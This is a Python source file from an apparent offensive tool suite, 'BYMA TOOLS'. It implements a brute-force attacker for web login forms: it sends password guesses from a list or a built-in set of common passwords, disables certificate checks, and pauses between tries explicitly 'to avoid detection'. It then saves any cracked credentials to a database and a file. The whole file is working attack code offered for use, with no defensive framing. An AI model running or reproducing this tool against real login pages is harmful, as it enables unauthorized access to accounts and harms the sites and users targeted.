"""
BYMA TOOLS - Brute Force Attacker
Tools untuk brute force login forms
"""
import requests
import json
from pathlib import Path
from tqdm import tqdm
from core.colors import (
    print_success, print_error, print_warning, print_info,
    print_result, print_section, cprint, Colors
)
from core.logger import get_logger
from core.database import get_database


class BruteForcer:
    """Brute force login form attacker"""
    
    def __init__(self):
        self.logger = get_logger()
        self.db = get_database()
    
    def bruteforce(self, url, username, passlist_path, output=None):
        """Main brute force function"""
        print_section(f"Brute Force Attack")
        
        print_info(f"Target: {url}")
        print_info(f"Username: {username}")
        
        # Load password list
        passwords = self._load_passwords(passlist_path)
        print_info(f"Password list: {len(passwords)} passwords")
        print()
        
        # Perform brute force
        print_info("Starting brute force attack...")
        result = self._attack(url, username, passwords)
        
        if result:
            print_success("Login successful!")
            print()
            cprint(f"    URL: {url}", Colors.BWHITE)
            cprint(f"    Username: {username}", Colors.BWHITE)
            cprint(f"    Password: {result}", Colors.BGREEN)
            
            # Save to database
            self.db.add_credential(url, "HTTP", username, result)
            
            if output:
                self._save_result(url, username, result, output)
            
            return result
        else:
            print_warning("Could not find valid credentials")
            return None
    
    def _load_passwords(self, passlist_path):
        """Load password list from file"""
        if passlist_path and Path(passlist_path).exists():
            with open(passlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        
        # Default password list
        return self._get_default_passwords()
    
    def _get_default_passwords(self):
        """Get default password list"""
        return [
            'password', '123456', '12345678', 'qwerty', 'abc123',
            'monkey', 'master', 'dragon', 'login', 'princess',
            'football', 'shadow', 'sunshine', 'trustno1', 'iloveyou',
            'batman', 'access', 'hello', 'charlie', 'letmein',
            'welcome', 'password1', 'password123', 'admin', 'admin123',
            'root', 'toor', 'pass', 'test', 'guest'
        ]
    
    def _attack(self, url, username, passwords):
        """Perform brute force attack"""
        session = requests.Session()
        
        for password in tqdm(passwords, desc="    Attacking"):
            try:
                # Prepare login data
                data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'email': username,
                    'login': password
                }
                
                # Send login request
                response = session.post(
                    url,
                    data=data,
                    timeout=10,
                    allow_redirects=False,
                    verify=False
                )
                
                # Check if login successful
                if self._check_login_success(response, password):
                    return password
                
                # Small delay to avoid detection
                import time
                time.sleep(0.1)
            
            except requests.RequestException:
                continue
        
        return None
    
    def _check_login_success(self, response, password):
        """Check if login was successful"""
        # Check response status
        if response.status_code in [301, 302, 303]:
            # Check if redirect is to dashboard or home
            location = response.headers.get('Location', '')
            if any(x in location.lower() for x in ['dashboard', 'home', 'admin', 'account']):
                return True
        
        # Check response content
        text = response.text.lower()
        success_indicators = ['welcome', 'dashboard', 'logout', 'sign out', 'profile']
        
        for indicator in success_indicators:
            if indicator in text:
                return True
        
        # Check for failed login indicators
        fail_indicators = ['invalid', 'incorrect', 'wrong', 'failed', 'error']
        for indicator in fail_indicators:
            if indicator in text:
                return False
        
        return False
    
    def _save_result(self, url, username, password, output_file):
        """Save result to file"""
        try:
            output_path = Path(output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            with open(output_path, 'w') as f:
                json.dump({
                    'url': url,
                    'username': username,
                    'password': password
                }, f, indent=2)
            
            print_success(f"Result saved to {output_file}")
        except Exception as e:
            print_error(f"Failed to save result: {e}")
